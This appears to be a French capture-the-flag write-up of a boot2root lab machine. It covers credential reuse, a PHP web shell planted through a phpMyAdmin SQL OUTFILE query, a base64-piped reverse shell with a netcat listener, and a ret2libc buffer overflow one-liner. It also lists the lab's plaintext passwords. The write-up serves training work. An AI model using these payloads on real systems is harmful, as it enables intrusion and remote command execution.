# Forum

## Rappel

Utilisateurs: 
- admin
- lmezard
- qudevide
- zaz
- wandre
- thor

Mot de passe: `!q\]Ej?*5K5cy*AJ`

En essayant ce mdp un peu partout (ssh puis forum) avec tous les users connus,
on trouve que ce mdp appartient à lmezard sur le forum.

## Gagner l'acces

Depuis la page utilisateur de lmezard, on trouve son mail
`laurie@borntosec.net`

On tente alors de se connecter a son webmail via la route `/webmail`
avec le meme mot de passe et ça fonctionne !

on lit le mail `DB Access`, il contient le couple d'identifiants
`root:Fg-'kKXBj87E:aJ$` qui devrait correspondre aux identifiants de la DB, ou de phpmyadmin

on tente alors de se connecter a PHPMyadmin, succes
On explore alors un peu, on tente d'identifer les hash des mots de passe, sans succes
on passe lmezard en admin du forum, ça ne nous aide pas plus...

## Reverse shell

Apres beaucoup de temps a chercher et tenter des trucs, on a une idée:

Utiliser la query console phpmyadmin pour créer un reverse shell php et le lancer via "forum"
Le probleme etant qu'on ne sait pas ou on peux ecrire, ni ou ecrire pour lancer un script

On télécharge alors my little forum a la version correspondante,
trouvée sur la page "update" du mode admin (finalement ça aura servi), qui est `2.3.4`

Et on tente d'explorer l'arborescence du forum, en mirroir avec ce qu'on a téléchargé.
Le seul chemin qui nous permettait à priori de lancer du php est le chemin `/forum/templates_c/<fichier>.php`

On tente alors d'ecrire a cet endroit, d'abord avec un `phpinfo()` pour tester
En supposant que le forum est rangé dans `/var/www/forum`

```SQL
SELECT '<?php phpinfo() ?>' INTO OUTFILE "/var/www/forum/templates_c/info_file.php"
```
Et ça fonctionne ! Acceder a `https://<ip>/forum/templates_c/info_file.php` renvoie bien les infos sur PHP

On fait alors la meme avec un fichier qui va ecouter le query parameter `cmd`,
l'executer dans un shell et nous renvoyer le resultat:

```SQL
SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE "/var/www/forum/templates_c/shell.php"
```
(trouvable dans `scripts/shell.php`)

On accede ensuite a `https://<ip>/forum/templates_c/shell.php?cmd=whoami` pour tester si ça fonctionne
on reçoit `www-data` ça fonctionne donc bien.

On sonde un peu pour avoir plus d'infos, notamment la présence ou non de python,
python est bien présent (`which python` retourne un resultat concluant)

On tente alors un script python de reverse shell connu (trouvable dans `scripts/shell.py.sh`),
mais par precaution pour eviter tout soucis avec des caracteres non gérés
on le passe en base64 puis on url encode la commande suivante

```
printf "<reverse shell en base64>" | base64 -d | sh
```
Ça décode code en base64 et puis ça le lance dans shell

De notre coté on lance netcat en mode écoute avec la commande suivante:
```
nc -nlvp <PORT>
```

On lance le script grace a notre fichier PHP et hop, ça fonctionne !

On stabilise le shell a l'aide du protocole suivant:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
puis CTRL-Z
```
stty raw -echo; fg
```
et enfin
```
export TERM=xterm
```

On a maintenant un reverse shell propre sur le serveur.

## Sur le serveur

Une fois sur le serveur on explore un peu.
Notre première trouvaille intéressante est dans `/home`
on y trouve le dossier `LOOKATME` qui est le seul dossier accessible.
Dedans on voit un fichier `password` nous donnant les credentials suivant:
`lmezard:G!@M6f4Eatau{sF" `

On essaie ses credentials en ssh puis en ftp,
succès sur le ftp. On explore ce qui est a disposition, deux fichiers
`fun` et `README`

On les télécharge sur notre machine et on comprend par le readme que c'est un puzzle
> Complete this little challenge and use the result as password for user 'laurie' to login in ssh

en faisant la commande `file` sur le fichier `fun`, on y comprend que c'est une archive tar.
on l'extrait et on regarde son contenu.

Plein de fichiers PCAP contenant des portions d'un programme en C.
Les fichiers sont dans le désordre mais son numérotés.
A l'aide de du script `merge.py` on remet les fichiers dans l'ordre et on les concatene
dans un seul fichier.

On retire les données poubelles avec `sanitize.sh`, et encore un peu de traitement a la main.
On compile le programme et hop

```
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

on s'execute et ça fonctionne, on est connectés en ssh en tant que laurie
(mdp: `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`)

Depuis le compte de laurie, on trouve deux fichiers, bomb et readme, encore une enignme.

## Da bomb
La bombe a 6 niveaux, chaque niveau a son code. Le mot de passe de thor correspond
aux 6 codes cote a cote.

Notre premier reflexe est de décompile le code avec radare2 et gihdra, selon nos préférences.

Certains niveaux sont plutot simples, ne constituent que d'une string écrite en clair
d'autres sont des algorithmes plus complexes.

Nous avons porté les codes dans le script `defuser.py`. Celui contient ou les solutions en dur
ou l'algorithme inversé qui permet d'obtenir le code.

Le seul vraiment complexe est le niveau 6, nous avons deviné qu'il fallait
une combinaison de 6 chiffres uniques allant de 1 a 6 inclus.

Nous avons alors mis en place un script qui désamorce la bombe, en tentant
les combinaisons possibles. Petit hic, bien que la bombe soit désarmocée
le mot de passe ne fonctionne pas...
(voir `defuser.bash` et `defuser.py`)

### Secret phase
Après pas mal d'essais et de dépatouillage:

En regardant le code décompilé, nous avons constaté qu'il existe une phase secrete
accessible en rajoutant "austinpowers" a la 4eme phase

On a pas trouvé le mdp de la phase secrete, mais en tentant des substitutions du mot de passe
de la 6 on trouve ce mot de passe pour thor:

`Publicspeakingisveryeasy.126241207201b2149opekmq426135`
Cette partie est très étrange et personne n'a réellement trouvé d'exu même,
A chaque fois, le mot de passe apparait par magie...

646da671ca01bb5d84dbb5fb2238dc8e
`./exploit_me $(python -c "print('A' * 140 + '\x60\xb0\xe6\xb7' + 'A'*4 + '\x58\xcc\xf8\xb7')")`



## Sources

Buffer overflow: https://beta.hackndo.com/buffer-overflow/
Oneliners de reverse shell: https://0xss0rz.github.io/2020-05-10-Oneliner-shells/
Stabiliser un reverse shell: https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal
